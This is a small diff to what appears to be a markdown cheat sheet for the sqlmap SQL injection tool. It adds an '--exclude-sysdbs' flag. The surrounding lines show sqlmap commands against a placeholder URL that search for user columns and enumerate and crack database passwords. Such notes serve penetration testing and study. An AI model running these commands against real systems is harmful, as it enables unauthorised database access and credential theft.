@@ -89,6 +89,9 @@ sqlmap -u "http://www.example.com/?id=1" --search -C user
 
 # Password enumeration and cracking
 sqlmap -u "http://www.example.com/?id=1" --passwords --batch
+
+# skip default dbs
+--exclude-sysdbs
 ```
 
 # Advanced Tuning
